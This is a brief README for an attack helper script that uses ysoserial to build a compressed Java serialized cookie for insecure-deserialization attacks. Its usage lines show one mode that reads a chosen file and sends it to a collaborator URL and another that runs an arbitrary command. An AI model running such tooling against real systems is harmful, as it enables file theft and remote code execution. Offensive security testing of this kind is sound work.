# generate_java_cookie
Generation of a compressed java serialized cookie to read the given file when insecure deserialization.  
A copy of `ysoserial-all.jar` (from https://github.com/frohoff/ysoserial) has to be in the same directory!

## Usage
```
# File reading
./generate_java_cookie.sh <GADGET> <FILE_TO_READ> <COLLABORATOR_URL>

# Command
./generate_java_cookie.sh <GADGET> <COMMAND>
```
